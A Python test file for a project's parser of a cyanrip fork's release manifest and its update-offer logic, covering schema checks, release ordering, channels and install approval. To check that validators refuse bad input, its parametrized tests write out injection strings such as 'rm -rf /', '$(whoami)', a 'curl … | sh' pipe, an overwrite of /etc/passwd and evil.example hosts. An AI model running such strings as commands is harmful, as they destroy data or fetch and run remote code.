"""The cyanrip fork's release manifest: parsing it, and what we do with it.

Two subjects, deliberately in one file because they are one seam: reading *their*
document (`deps/ripper_manifest.py`) and deciding what it means given *our* record
(`deps/ripper_offer.py`).

The fixture below is the manifest the fork actually published (their
`PLATTERPUS-AUTO-UPDATE-INTEGRATION.md`, 2026-08-07), not one invented to suit the
parser — a fixture written by the consumer tests the consumer's idea of the format,
which is the shared-ancestor failure `CLAUDE.md` names.
"""

from __future__ import annotations

import json
from typing import Any

import pytest

from platterpus.deps import fork_source
from platterpus.deps.ripper_manifest import (
    CHANNEL_BETA,
    CHANNEL_STABLE,
    CHANNELS,
    SUPPORTED_SCHEMA,
    SUPPORTED_SCHEMAS,
    CancellableFetcher,
    RipperManifest,
    fetch_manifest,
    parse_manifest,
)
from platterpus.deps.ripper_offer import (
    OFFER_AVAILABLE,
    OFFER_MISMATCHED,
    OFFER_NOT_DETERMINED,
    OFFER_UP_TO_DATE,
    _seq_from_manifest,
    evaluate_offer,
)

# The published manifest, verbatim in shape. `install` is spelled out rather than
# elided with "..." as their prose did, because our validator checks the host.
PUBLISHED: dict[str, Any] = {
    "schema": 1,
    "project": "cyanrip-fork",
    "default_channel": "stable",
    "latest_seq": 11,
    "channels": {
        "stable": {
            "version": "0.9.4-rc1+platterpus.5",
            "commit": "ddf7ac3",
            "release_seq": 11,
            "handshake_round": 7,
            "round_closed": True,
            "install": "https://github.com/rmccann-hub/cyanrip/archive/ddf7ac3.tar.gz",
        },
        "beta": {
            "version": "0.9.4-rc1+platterpus.5",
            "commit": "ddf7ac3",
            "release_seq": 11,
            "handshake_round": 7,
            "round_closed": True,
            "install": "https://github.com/rmccann-hub/cyanrip/archive/ddf7ac3.tar.gz",
        },
    },
}


# The schema-2 manifest, verbatim from the fork's `release-manifest.json` at
# `c455683` — the document live at `MANIFEST_URL` today. Round 11 added the `build`
# field and moved the number; both are here because both are what a user's
# Platterpus now fetches.
#
# **Kept as a second fixture rather than an edit to the first.** Schema 1 is still
# accepted and still has to parse: it is the shape of every manifest published
# before the bump, which is the direction round 11 §0's downgrade path runs in. One
# fixture mutated into the new shape would have deleted the only test of the old one.
PUBLISHED_V2: dict[str, Any] = {
    "channels": {
        "beta": {
            "build": "meson setup build -Ddeclare_released=true && ninja -C build",
            "commit": "c4d1a00",
            "handshake_round": 10,
            "install": "https://github.com/rmccann-hub/cyanrip/archive/c4d1a00.tar.gz",
            "release_seq": 16,
            "round_closed": True,
            "version": "0.9.4-rc1+platterpus.6",
        },
        "stable": {
            "build": "meson setup build -Ddeclare_released=true && ninja -C build",
            "commit": "c4d1a00",
            "handshake_round": 10,
            "install": "https://github.com/rmccann-hub/cyanrip/archive/c4d1a00.tar.gz",
            "release_seq": 16,
            "round_closed": True,
            "version": "0.9.4-rc1+platterpus.6",
        },
    },
    "default_channel": "stable",
    "latest_seq": 16,
    "manifest_url": (
        "https://raw.githubusercontent.com/rmccann-hub/cyanrip/"
        "platterpus-fork/release-manifest.json"
    ),
    "note": (
        "Machine-readable. Order by release_seq -- the version string cannot be "
        "ordered, because the part that advances is SemVer build metadata, which "
        "is ignored for precedence."
    ),
    "project": "cyanrip-fork",
    "repo": "https://github.com/rmccann-hub/cyanrip",
    "schema": 2,
}


def _manifest(**overrides: Any) -> RipperManifest:
    """Parse the published manifest with ``channels`` patched, asserting it parsed."""
    document = json.loads(json.dumps(PUBLISHED))
    for channel, patch in overrides.items():
        document["channels"][channel].update(patch)
    parsed = parse_manifest(json.dumps(document))
    assert parsed is not None, "the published manifest shape must parse"
    return parsed


# --- Reading their document -------------------------------------------------


def test_the_published_manifest_parses() -> None:
    """The floor: if this fails, every other test here is asserting about nothing."""
    manifest = _manifest()
    stable = manifest.channel(CHANNEL_STABLE)
    assert stable is not None
    assert stable.commit == "ddf7ac3"
    assert stable.release_seq == 11
    assert stable.handshake_round == 7
    assert stable.round_closed is True
    assert stable.build_tag == "platterpus-fork-gddf7ac3"


def test_ordering_is_by_release_seq_not_the_version_string() -> None:
    """**The rule the fork asked for, and the reason it is not optional.**

    Their version is upstream's `0.9.4-rc1` plus `+platterpus.N` — SemVer *build
    metadata*, which the spec says MUST be ignored for precedence. So two different
    releases can carry a byte-identical version string, and any implementation that
    compared versions would see equality forever and never offer an upgrade.

    This test pins exactly that case: same version, higher `release_seq`. A
    version-comparing implementation passes every other test in this file and fails
    this one.
    """
    manifest = _manifest(stable={"release_seq": 12, "commit": "abc1234"})
    stable = manifest.channel(CHANNEL_STABLE)
    assert stable is not None
    assert stable.version == "0.9.4-rc1+platterpus.5"  # unchanged, deliberately

    # Installed release 11, offered release 12, identical version strings.
    assert manifest.newer_than(CHANNEL_STABLE, 11) is stable
    # And the converse: equal is not newer, so an offer is never re-made.
    assert manifest.newer_than(CHANNEL_STABLE, 12) is None
    # A lower published seq is never offered — that would be a downgrade.
    assert manifest.newer_than(CHANNEL_STABLE, 13) is None


def test_the_channel_is_read_from_the_manifest_not_sniffed_from_the_version() -> None:
    """A substring check for "beta" is wrong in both directions; prove neither happens.

    The fork spells a pre-release `-beta.1`; we spell ours `b1`. A sniffer would
    mislabel one of them. So: a **stable** row whose version happens to contain the
    word beta stays stable, and a **beta** row whose version contains no such word
    stays beta. Only the manifest key decides.
    """
    manifest = _manifest(
        stable={"version": "0.9.4-rc1+platterpus.6-beta.9"},
        beta={"version": "0.9.4-rc1+platterpus.7", "release_seq": 12},
    )
    stable = manifest.channel(CHANNEL_STABLE)
    beta = manifest.channel(CHANNEL_BETA)
    assert stable is not None and beta is not None
    assert stable.channel == CHANNEL_STABLE, "a 'beta'-looking version is still stable"
    assert beta.channel == CHANNEL_BETA, "a clean-looking version is still beta"


@pytest.mark.parametrize("schema", [0, 3, 99])
def test_an_unimplemented_schema_is_refused_not_guessed_at(schema: int) -> None:
    """Refusing is what the field is FOR — a consumer that guesses makes it useless."""
    document = json.loads(json.dumps(PUBLISHED))
    document["schema"] = schema
    assert parse_manifest(json.dumps(document)) is None


def test_the_supported_schema_is_the_one_the_newest_fixture_declares() -> None:
    """Non-triviality floor for the test above: it must be refusing the *right* thing.

    Without this, `SUPPORTED_SCHEMA` could drift to a value no manifest carries and
    the parametrized refusals above would all pass while the real manifest failed.

    Checked against `PUBLISHED_V2`, the *newest* real document, because that is the
    one a user's Platterpus meets today.
    """
    assert PUBLISHED_V2["schema"] == SUPPORTED_SCHEMA


def test_every_accepted_schema_has_a_real_fixture_behind_it() -> None:
    """`SUPPORTED_SCHEMAS` may not carry a number nothing in this file exercises.

    The pair above tests the *newest*. This tests the rest, and it is the one that
    stops the accepted set quietly growing a value whose fields nobody implemented —
    the schema-1 half is exactly what round 11 §0's downgrade path depends on.
    """
    fixtures = {doc["schema"] for doc in (PUBLISHED, PUBLISHED_V2)}
    missing = sorted(SUPPORTED_SCHEMAS - fixtures)
    assert not missing, (
        f"schema(s) {missing} are accepted but no real published document in this "
        "file exercises them — add the fixture or stop accepting the number."
    )


@pytest.mark.parametrize(
    "commit",
    [
        "",
        "ddf7ac",  # too short
        "d" * 41,  # too long
        "DDF7AC3",  # upper case — not what git prints
        "ddf7ac3; rm -rf /",
        "ddf7ac3 --upload-pack=evil",
        "$(whoami)",
        "../../etc/passwd",
        "ddf7ac3\nnext-line",
        "zzzzzzz",  # right length, not hex
    ],
)
def test_an_implausible_commit_is_refused(commit: str) -> None:
    """**The argv guard, not a tidiness check.**

    This field is handed to `git checkout --force --detach` inside the container by
    `fork_source.target_for_commit`. A manifest that has been tampered with — or has
    simply gone wrong — must not be able to put a metacharacter on a command line.
    Refused rather than sanitised: there is no *nearly* valid commit, and a
    "repaired" one would name a different build.
    """
    document = json.loads(json.dumps(PUBLISHED))
    document["channels"]["stable"]["commit"] = commit
    parsed = parse_manifest(json.dumps(document))
    # The stable row drops; beta is untouched and still parses, which is the
    # row-level rather than document-level failure this is supposed to have.
    assert parsed is None or parsed.channel(CHANNEL_STABLE) is None


def test_a_bad_row_drops_only_itself() -> None:
    """One malformed channel must not hide a good one."""
    document = json.loads(json.dumps(PUBLISHED))
    document["channels"]["stable"]["commit"] = "not-a-sha"
    parsed = parse_manifest(json.dumps(document))
    assert parsed is not None
    assert parsed.channel(CHANNEL_STABLE) is None
    assert parsed.channel(CHANNEL_BETA) is not None


def test_round_closed_must_be_a_real_boolean() -> None:
    """Tri-state discipline: a missing `round_closed` is not `False`.

    Defaulting it False would report a closed round as open; defaulting it True
    would claim verification nobody performed. Dropping the row makes it "not
    determined", which is the only honest option.
    """
    for value in (None, "true", 1, "yes", ""):
        document = json.loads(json.dumps(PUBLISHED))
        document["channels"]["stable"]["round_closed"] = value
        parsed = parse_manifest(json.dumps(document))
        assert parsed is None or parsed.channel(CHANNEL_STABLE) is None, (
            f"round_closed={value!r} must not be read as a boolean"
        )


def test_the_wrong_project_is_refused() -> None:
    document = json.loads(json.dumps(PUBLISHED))
    document["project"] = "some-other-project"
    assert parse_manifest(json.dumps(document)) is None


def test_an_install_url_off_our_hosts_is_refused() -> None:
    for url in (
        "http://github.com/x/y.tar.gz",  # not https
        "https://evil.example.com/x.tar.gz",
        "https://github.com.evil.example/x.tar.gz",
        "ftp://github.com/x.tar.gz",
    ):
        document = json.loads(json.dumps(PUBLISHED))
        document["channels"]["stable"]["install"] = url
        parsed = parse_manifest(json.dumps(document))
        assert parsed is None or parsed.channel(CHANNEL_STABLE) is None, url


@pytest.mark.parametrize(
    "text",
    [
        "",
        "   ",
        "null",
        "[]",
        "42",
        '"a string"',
        "{",
        "{}",
        '{"schema": 1}',
        '{"schema": 1, "project": "cyanrip-fork", "channels": []}',
        "\x00\x01\x02",
    ],
)
def test_parse_never_raises_on_junk(text: str) -> None:
    """Parsers of external output return a best-effort answer; they do not raise."""
    assert parse_manifest(text) is None


def test_fetch_failure_is_not_determined_never_a_crash() -> None:
    def boom(_url: str) -> str:
        raise OSError("network is down")

    assert fetch_manifest(fetch=boom) is None


def test_a_cancelled_fetcher_refuses_to_start() -> None:
    """`cancel()` before `fetch()` must not be silently ignored.

    The gap between constructing a worker and its thread actually running is real,
    and a cancel that lands there would otherwise start a network read the window
    has already decided to abandon.
    """
    fetcher = CancellableFetcher()
    fetcher.cancel()
    with pytest.raises(ValueError):
        fetcher.fetch("https://example.invalid/manifest.json")


def test_cancel_is_safe_before_during_and_twice() -> None:
    """A cancel must never be the thing that raises during teardown."""
    fetcher = CancellableFetcher()
    fetcher.cancel()
    fetcher.cancel()  # idempotent


def test_our_channel_vocabulary_matches_the_apps_own() -> None:
    """One Settings vocabulary covers both checks, so the two tuples must agree.

    `settings_validation` derives its allowed sets from these two tuples separately.
    If they drifted, a user could select a channel for one check that the other
    rejects — the kind of split that is invisible until someone flips the setting.
    """
    from platterpus.update_check import CHANNELS as APP_CHANNELS

    assert set(CHANNELS) == set(APP_CHANNELS)


# --- Our pin's place in their sequence --------------------------------------


def test_the_pinned_commit_has_a_recorded_release_number() -> None:
    """**The gate that stops the pin and its sequence number from splitting.**

    Moving `FORK_PIN` without recording its `release_seq` would leave the update
    check comparing against a stale number — silently offering a downgrade, or
    silently suppressing a real upgrade. Keying the map by commit makes the omission
    detectable, and this is what detects it.
    """
    assert fork_source.FORK_PIN in fork_source.FORK_RELEASE_SEQ_BY_PIN, (
        f"FORK_PIN is {fork_source.FORK_PIN!r} but FORK_RELEASE_SEQ_BY_PIN has no "
        f"entry for it. Read the release_seq off the fork's release-manifest.json "
        f"and record it — do not guess, and do not derive it from the version string."
    )
    assert fork_source.FORK_PIN_RELEASE_SEQ is not None


def test_the_recorded_sequence_agrees_with_the_published_manifest() -> None:
    """Check the constant against the fork's own document, not against itself.

    The fixture is their published manifest, so this compares our recorded number to
    the number they published for the same commit — the artifact, not our memory of
    it.
    """
    stable = _manifest().channel(CHANNEL_STABLE)
    assert stable is not None
    if stable.commit == fork_source.FORK_PIN:
        assert fork_source.release_seq_for_commit(fork_source.FORK_PIN) == (
            stable.release_seq
        )


def test_every_recorded_sequence_agrees_with_a_published_manifest() -> None:
    """Our whole commit→sequence map, checked against **their documents**.

    The sibling above checks one entry — the pin. That was enough while the map had
    one row, and it is exactly the shape `CLAUDE.md` warns about: a list checked
    against itself is consistent, not verified. Every row here is a claim about a
    number the fork published, so every row is compared to a manifest fixture that
    actually carries it.

    Both fixtures are searched because they are two published documents (schema 1 at
    `ddf7ac3`, schema 2 at `c455683`) and a row may be stated by either. A row stated
    by *neither* is not failed here — it may come from a manifest revision we do not
    keep a fixture of — but it is counted, and the floor below refuses a run in which
    nothing was actually compared.
    """
    published: dict[str, int] = {}
    for document in (PUBLISHED, PUBLISHED_V2):
        for row in document["channels"].values():
            published[str(row["commit"])] = int(row["release_seq"])

    checked = 0
    for commit, seq in fork_source.FORK_RELEASE_SEQ_BY_PIN.items():
        if commit not in published:
            continue
        checked += 1
        assert seq == published[commit], (
            f"FORK_RELEASE_SEQ_BY_PIN says {commit} is release {seq}, but the fork's "
            f"published manifest says {published[commit]}. Read the number off their "
            f"document; never derive it from a version string."
        )
    assert checked >= 2, (
        f"only {checked} recorded sequence(s) were compared against a published "
        "manifest — this check can pass by matching nothing, so it needs a floor."
    )


def test_an_unknown_commit_has_no_sequence() -> None:
    """Tri-state: a build outside the numbered releases returns None, not 0."""
    assert fork_source.release_seq_for_commit("0000000") is None
    assert fork_source.release_seq_for_commit("") is None
    # A test pin is deliberately absent from the map — it was never a release.
    assert fork_source.release_seq_for_commit(fork_source.FORK_TEST_PIN) is None


def test_a_dirty_build_of_a_known_commit_still_orders() -> None:
    assert fork_source.release_seq_for_commit(f"{fork_source.FORK_PIN}-dirty") == (
        fork_source.FORK_PIN_RELEASE_SEQ
    )


# --- What the offer says ----------------------------------------------------


def test_up_to_date_and_not_determined_are_different_answers() -> None:
    """A check that cannot reach the manifest must never report "you're current".

    This is the "satisfied by finding nothing" failure in its most direct form: an
    unreachable network and an up-to-date ripper would render identically, and the
    reassuring one is the wrong default.
    """
    # `installed_commit` is pinned to a build we recognise so the MANIFEST is the
    # only thing failing. Passing nothing used to mean "assume the pinned build";
    # since 2026-08-18 it means "we could not identify one", which is a different
    # question with a different answer (see the mismatch tests below).
    unreachable = evaluate_offer(None, CHANNEL_STABLE, installed_commit="ddf7ac3")
    assert unreachable.verdict == OFFER_NOT_DETERMINED
    assert not unreachable.is_actionable
    assert not unreachable.can_install

    current = evaluate_offer(_manifest(), CHANNEL_STABLE, installed_commit="ddf7ac3")
    assert current.verdict == OFFER_UP_TO_DATE
    assert unreachable.verdict != current.verdict


def test_an_unnumbered_build_is_not_determined_not_an_upgrade() -> None:
    """A mid-round test pin has no place in the release sequence, and we say so.

    Offering an "upgrade" from a build we cannot order would be a guess presented as
    a fact, and during a hardware session it is exactly the wrong advice.
    """
    offer = evaluate_offer(
        _manifest(), CHANNEL_STABLE, installed_commit=fork_source.FORK_TEST_PIN
    )
    assert offer.verdict == OFFER_NOT_DETERMINED
    assert fork_source.FORK_TEST_PIN in offer.detail


def test_a_newer_build_states_the_unapproved_consequence() -> None:
    """The offer must say what taking it costs, in the offer itself.

    A build from a round our record has not verified makes every subsequent rip
    report `unapproved`. That is the whole reason this flow exists rather than an
    auto-updater, so it is asserted rather than left to review.
    """
    manifest = _manifest(
        stable={
            "release_seq": 14,
            "commit": "beefcaf",
            "handshake_round": 9,
            "round_closed": True,
        }
    )
    offer = evaluate_offer(manifest, CHANNEL_STABLE, installed_commit="ddf7ac3")
    assert offer.verdict == OFFER_AVAILABLE
    assert offer.is_actionable
    assert offer.would_be_unapproved is True
    assert "unapproved" in offer.detail
    # And it must hand over the exact route, which drives the same step engine the
    # wizard does rather than a copied shell snippet.
    assert "--install-ripper beefcaf" in offer.detail


def test_an_open_round_on_their_side_is_said_out_loud() -> None:
    manifest = _manifest(
        stable={
            "release_seq": 14,
            "commit": "beefcaf",
            "handshake_round": 9,
            "round_closed": False,
        }
    )
    offer = evaluate_offer(manifest, CHANNEL_STABLE, installed_commit="ddf7ac3")
    assert offer.verdict == OFFER_AVAILABLE
    assert "OPEN" in offer.detail


def test_an_unknown_channel_falls_back_to_stable_never_widens() -> None:
    """Failing toward *more* offers is not a safe direction."""
    offer = evaluate_offer(_manifest(), "nightly", installed_commit="ddf7ac3")
    assert offer.channel == CHANNEL_STABLE


def test_the_offer_never_installs_anything() -> None:
    """A structural guard, because the consequence of getting this wrong is silent.

    `ripper_offer` must not import or call the install machinery. Asserted on the
    module source rather than by observing behaviour: an install path that is merely
    never *reached* today is one refactor from being reached tomorrow.
    """
    import inspect

    from platterpus.deps import ripper_offer

    source = inspect.getsource(ripper_offer)
    for forbidden in (
        "fork_build_commands",
        "install_command",
        "build_command",
        "subprocess",
        "Popen",
        "HostSetup",
    ):
        assert forbidden not in source, (
            f"ripper_offer references {forbidden!r} — this module decides what to "
            f"SAY, never what to run. Installing a ripper is a handshake event and "
            f"must stay a person's decision."
        )


# --- Schema 2's `build` field: parsed, never executed -----------------------
#
# Round 11 §J1 asked us to take the build command from the manifest instead of
# hardcoding `-Ddeclare_released=true`, because the option does not exist before
# `+platterpus.6` and meson fails the WHOLE configure on an unknown `-D` — so a
# constant would make our own current pin unbuildable and kill the downgrade path.
#
# We agreed with the requirement and refused the mechanism. The field is a *shell
# command string*; running it would turn a remote JSON document into arbitrary
# command execution inside the user's container, on a path whose later steps run
# `sudo install`. So we parse it, keep only allowlisted `-D` options, and build with
# our own command. These tests are that boundary.


def test_the_published_v2_manifest_parses_and_carries_the_build_option() -> None:
    """The floor for this whole section, against the real document."""
    parsed = parse_manifest(json.dumps(PUBLISHED_V2))
    assert parsed is not None, "the live schema-2 manifest must parse"
    assert parsed.schema == 2
    stable = parsed.channel(CHANNEL_STABLE)
    assert stable is not None
    assert stable.commit == "c4d1a00"
    assert stable.meson_options == ("-Ddeclare_released=true",), (
        "the one option the live manifest carries did not survive validation"
    )


def test_a_schema_1_manifest_still_parses_and_carries_no_options() -> None:
    """The downgrade direction, which is the reason schema 1 stays accepted.

    A commit predating `meson_options.txt` must be built with a bare `meson setup`;
    empty options is not a degraded answer here, it is the *correct* one.
    """
    parsed = parse_manifest(json.dumps(PUBLISHED))
    assert parsed is not None
    stable = parsed.channel(CHANNEL_STABLE)
    assert stable is not None
    assert stable.commit == "ddf7ac3", "fixture drifted off our production pin"
    assert stable.meson_options == ()


@pytest.mark.parametrize(
    ("label", "build"),
    [
        ("shell chain into curl", "meson setup build && curl http://e.sh | sh"),
        ("semicolon rm", "meson setup build; rm -rf /home && ninja -C build"),
        ("backtick", "meson setup build `id` && ninja -C build"),
        ("dollar-paren", "meson setup build $(id) && ninja -C build"),
        ("redirect", "meson setup build > /etc/passwd && ninja -C build"),
        ("unknown option", "meson setup build -Dprefix=/evil && ninja -C build"),
        ("disallowed value", "meson setup build -Ddeclare_released=yes"),
        ("option with no value", "meson setup build -Ddeclare_released"),
        ("a different program", "make install && ninja -C build"),
        ("not a string", 42),
        ("a list", ["meson", "setup"]),
    ],
)
def test_a_build_field_we_do_not_fully_understand_yields_no_options(
    label: str, build: Any
) -> None:
    """Refuse the WHOLE field, never a partial reading.

    Two failures are being prevented and they are different. The obvious one is
    execution — nothing here is ever run, so the shell metacharacters are inert by
    construction; what these assert is that the *option extraction* does not quietly
    salvage `-Ddeclare_released=true` out of a command that also says something we
    did not understand.

    The subtler one: silently dropping the part we dislike and keeping the rest turns
    a build instruction into something nobody wrote. A command we only partly
    understand is a command we do not understand.
    """
    document = json.loads(json.dumps(PUBLISHED_V2))
    document["channels"]["stable"]["build"] = build
    parsed = parse_manifest(json.dumps(document))
    assert parsed is not None, "a bad `build` must not drop the row — it is not fatal"
    stable = parsed.channel(CHANNEL_STABLE)
    assert stable is not None
    assert stable.meson_options == (), f"{label}: options survived validation"


def test_an_oversized_build_field_is_refused() -> None:
    """Bounded like every other inbound string — the seam's line-length rule."""
    document = json.loads(json.dumps(PUBLISHED_V2))
    document["channels"]["stable"]["build"] = "-Ddeclare_released=true " * 500
    parsed = parse_manifest(json.dumps(document))
    assert parsed is not None
    stable = parsed.channel(CHANNEL_STABLE)
    assert stable is not None and stable.meson_options == ()


def test_the_refusals_above_are_not_vacuous() -> None:
    """The revert check, as an assertion rather than a memory.

    Every case in the parametrized test expects `()`. If the validator were changed
    to return `()` unconditionally, all of them would still pass — and so would the
    schema-1 test, which also expects `()`. This is the one that would fail.
    """
    accepted = parse_manifest(json.dumps(PUBLISHED_V2))
    assert accepted is not None
    stable = accepted.channel(CHANNEL_STABLE)
    assert stable is not None
    assert stable.meson_options, (
        "the validator accepts nothing at all — every refusal test above is vacuous"
    )


# --- The one-click install (redesigned 2026-08-18) ---------------------------
#
# Maintainer directive: *"the autoupdate on platterpus should take the next viable
# candidate without the user needing to pick … it shouldnt need to be explicity
# callled out by eitether rop unless very impartant"*, and *"make sure we can try
# will pins or non autoupdates, but that is manually and by script most likely"*.
#
# The whole design reduces to one question asked of every offer: **does taking this
# build cost the user anything?** If not, it installs on one click and no SHA is ever
# shown. If it does, the consequence is stated and a command line is handed over,
# because a deliberate act is the right friction for a build nobody has verified.


def test_an_unrecognised_installed_build_offers_the_approved_one() -> None:
    """The reported defect, as a test.

    An operator running a build outside the release sequence used to be told it *"is
    not one of the fork's numbered releases … Install a released build first if you
    want update checks to work"* — accurate, and a dead end. The app knew which build
    it wanted and made a person retype it.
    """
    offer = evaluate_offer(_manifest(), CHANNEL_STABLE, installed_commit="deadbee")
    assert offer.verdict == OFFER_MISMATCHED
    assert offer.can_install
    assert offer.install_commit == fork_source.FORK_PIN
    assert offer.auto_installable is True, (
        "installing the approved pin is what makes rips report `approved` — there is "
        "no consequence to weigh, so there is nothing for the user to read first"
    )
    assert "--install-ripper" not in offer.detail, (
        "a costless install must not hand the user a command line; that is the "
        "friction this redesign removed"
    )


def test_an_unidentifiable_ripper_is_never_reported_as_the_pinned_build() -> None:
    """``installed_commit=None`` means "we could not tell", not "assume the pin".

    The old fallback made a machine running **stock upstream cyanrip** — which has no
    fork commit in its banner — render as *"your cyanrip build is current:
    0.9.4-rc1+platterpus.5 (ddf7ac3)"*. Every word of that sentence was assembled
    from constants, and it is the same family as the `_observed_ripper_banner`
    defect: a value nothing produced, read through a default that cannot raise.
    """
    offer = evaluate_offer(_manifest(), CHANNEL_STABLE, installed_commit=None)
    assert offer.verdict == OFFER_MISMATCHED
    assert offer.verdict != OFFER_UP_TO_DATE
    assert (
        fork_source.FORK_EXPECTED_VERSION not in offer.detail.split("Expected:")[0]
    ), (
        "the part of the message describing what is INSTALLED must not name the "
        "pinned version — that is the claim we cannot make"
    )
    assert offer.install_commit == fork_source.FORK_PIN


def test_a_build_a_closed_round_approved_installs_on_one_click() -> None:
    """The "next viable candidate", taken without the user picking anything.

    Viable means **our** record approves it: their round is closed *and* our record
    has closed that round too. Both halves, because one side's GO is half a bilateral
    contract — the failure this project has now paid for three times.
    """
    from platterpus.handshake_approval import APPROVED_BY_ROUND

    manifest = _manifest(
        stable={
            "release_seq": 99,
            "commit": "abc1234",
            "handshake_round": APPROVED_BY_ROUND,
            "round_closed": True,
        }
    )
    offer = evaluate_offer(manifest, CHANNEL_STABLE, installed_commit="ddf7ac3")
    assert offer.verdict == OFFER_AVAILABLE
    assert offer.would_be_unapproved is False
    assert offer.auto_installable is True
    assert offer.install_commit == "abc1234"
    assert "--install-ripper" not in offer.detail
    assert "unapproved" not in offer.detail


def test_a_build_no_round_here_has_verified_is_never_auto_installed() -> None:
    """The "unless very important" case, and the revert check for the one above.

    Both tests drive the same code path with one field different — the round number —
    so a change that made everything auto-installable would fail here, and a change
    that made nothing auto-installable would fail there. Neither can pass alone.
    """
    from platterpus.handshake_approval import APPROVED_BY_ROUND

    manifest = _manifest(
        stable={
            "release_seq": 99,
            "commit": "abc1234",
            "handshake_round": APPROVED_BY_ROUND + 1,
            "round_closed": True,
        }
    )
    offer = evaluate_offer(manifest, CHANNEL_STABLE, installed_commit="ddf7ac3")
    assert offer.verdict == OFFER_AVAILABLE
    assert offer.would_be_unapproved is True
    assert offer.auto_installable is False, (
        "a build our record has not verified must never be installed on one click — "
        "that is what would silently convert a library of jointly-verified archival "
        "records into unverified ones"
    )
    assert "unapproved" in offer.detail
    assert "--install-ripper abc1234" in offer.detail, (
        "pins stay reachable, manually: the route must still be handed over"
    )


def test_a_session_test_pin_is_never_installed_over() -> None:
    """A test pin is *supposed* to be there during a hardware session.

    Auto-installing over it would destroy the evidence the session exists to gather,
    at the moment it is being gathered. The route back is offered; it is never the
    default.
    """
    offer = evaluate_offer(
        _manifest(), CHANNEL_STABLE, installed_commit=fork_source.FORK_TEST_PIN
    )
    assert offer.verdict == OFFER_NOT_DETERMINED
    assert offer.auto_installable is False
    assert offer.can_install, "the way back must still be reachable"
    assert offer.install_commit == fork_source.FORK_PIN


def test_being_ahead_of_the_approved_pin_is_said_out_loud() -> None:
    """ "Newest published" and "what your rips are checked against" are two questions.

    A user who took a newer build sits at the head of the channel *and* fails
    `approve_ripper` on every rip. The old text answered only the first and said
    "your cyanrip build is current" to someone whose every report said `unapproved`.
    """
    manifest = _manifest(stable={"release_seq": 16, "commit": "c4d1a00"})
    offer = evaluate_offer(manifest, CHANNEL_STABLE, installed_commit="c4d1a00")
    assert offer.verdict == OFFER_UP_TO_DATE
    assert "unapproved" in offer.detail
    assert offer.install_commit == fork_source.FORK_PIN, (
        "the remedy is the approved pin, and it must be offered rather than described"
    )
    assert offer.auto_installable is True


def test_being_on_the_approved_pin_says_nothing_alarming() -> None:
    """The floor for the test above: the healthy state must stay quiet.

    Without this, a change that appended the ⚠ paragraph unconditionally would pass
    every other test in this file — and would tell every correctly-configured user
    their rips were unapproved.
    """
    offer = evaluate_offer(
        _manifest(), CHANNEL_STABLE, installed_commit=fork_source.FORK_PIN
    )
    assert offer.verdict == OFFER_UP_TO_DATE
    assert "unapproved" not in offer.detail
    assert not offer.can_install, "there is nothing to install when nothing is wrong"
    assert offer.auto_installable is False


def test_the_beta_channel_is_read_from_settings_not_guessed() -> None:
    """*"assume last most stable is good, then if beta flags are checked, look for
    those, but it should still be an autoupdate."*

    Both channels reach the same one-click path — the channel decides *which* build
    is the candidate, never *whether* the app may install it. That distinction is
    what keeps "opt into betas" from also meaning "opt into a weaker safety gate".
    """
    from platterpus.handshake_approval import APPROVED_BY_ROUND

    manifest = _manifest(
        beta={
            "release_seq": 99,
            "commit": "abc1234",
            "handshake_round": APPROVED_BY_ROUND,
            "round_closed": True,
        }
    )
    on_stable = evaluate_offer(manifest, CHANNEL_STABLE, installed_commit="ddf7ac3")
    assert on_stable.verdict == OFFER_UP_TO_DATE, "stable must not see a beta row"

    on_beta = evaluate_offer(manifest, CHANNEL_BETA, installed_commit="ddf7ac3")
    assert on_beta.verdict == OFFER_AVAILABLE
    assert on_beta.auto_installable is True
    assert on_beta.install_commit == "abc1234"
    assert "beta channel" in on_beta.detail, "a beta must say it is one"


def test_the_reported_situation_against_the_real_published_manifest() -> None:
    """**The maintainer's actual machine, replayed against the live document.**

    Reported 2026-08-17: *"things are not lining up, why are versions different, i
    cant update cyanrip fork directly, it says there are differences even if i do."*
    They were running `c4d1a00` — which is not a stray build at all, it is the
    fork's **current published stable release** (`release_seq: 16`) — while this
    Platterpus pins `ddf7ac3` (release 11, the build round 8 approved).

    The old answer was *"not one of the fork's numbered releases — a mid-round test
    pin, or a commit installed by hand"*, with an instruction to install a released
    build. Every clause of that was wrong about a published release, which is what
    made it unactionable rather than merely unhelpful.

    Asserted against `PUBLISHED_V2` — the fork's own file, not a fixture shaped to
    suit us — because *"am I answering from the artifact, or from my memory of the
    artifact?"* is the question this whole cycle turned on.
    """
    manifest = parse_manifest(json.dumps(PUBLISHED_V2))
    assert manifest is not None
    offer = evaluate_offer(manifest, CHANNEL_STABLE, installed_commit="c4d1a00")

    # They are on the newest published build, and that is said plainly.
    assert offer.verdict == OFFER_UP_TO_DATE
    assert "newest published" in offer.detail
    # AND on a build our record has not approved, which is the half that was
    # missing — and the half that explains the `unapproved` they kept seeing.
    assert "unapproved" in offer.detail
    assert fork_source.FORK_PIN in offer.detail
    # AND the remedy is offered rather than described. No commit to type.
    assert offer.install_commit == fork_source.FORK_PIN
    assert offer.auto_installable is True
    assert "--install-ripper" not in offer.detail


# --- Where a build sits in the sequence: TWO sources, and why one is not enough ---
#
# `FORK_RELEASE_SEQ_BY_PIN` is a hand-maintained map. That is unavoidable for builds
# the fork has moved past — our own pin `ddf7ac3` (release 11) is the head of no
# channel and so appears in no current manifest — but it is the WRONG only-source for
# builds newer than this Platterpus, because a map cannot list a release published
# after it shipped. The 2026-08-17 report is that failure: `c4d1a00` was the fork's
# current stable and our map had never heard of it, so the app called it a build with
# no story. Adding the commit to the map fixed that build. These tests are about the
# class, and specifically about the NEXT one.


def _future_release(commit: str, seq: int) -> dict[str, Any]:
    """A manifest naming a release we do not have, as the fork would publish it.

    Deliberately built from `PUBLISHED_V2` — their real document — with only the two
    fields that must change, so it stays their format rather than becoming ours.
    """
    document = json.loads(json.dumps(PUBLISHED_V2))
    for channel in ("stable", "beta"):
        document["channels"][channel]["commit"] = commit
        document["channels"][channel]["release_seq"] = seq
        document["channels"][channel]["install"] = (
            f"https://github.com/rmccann-hub/cyanrip/archive/{commit}.tar.gz"
        )
    return document


def test_a_release_published_after_us_is_placed_from_their_manifest() -> None:
    """The next release, which no map of ours can possibly list.

    `abc1234` is release 17 in this document and absent from
    `FORK_RELEASE_SEQ_BY_PIN` — the exact state `c4d1a00` was in on 2026-08-17, one
    release later. The answer must be "you are on the newest published build, and it
    is not the one we were verified against", NOT "this build is not one this
    Platterpus was verified against" with the first half missing.
    """
    future = _future_release("abc1234", 17)
    manifest = parse_manifest(json.dumps(future))
    assert manifest is not None
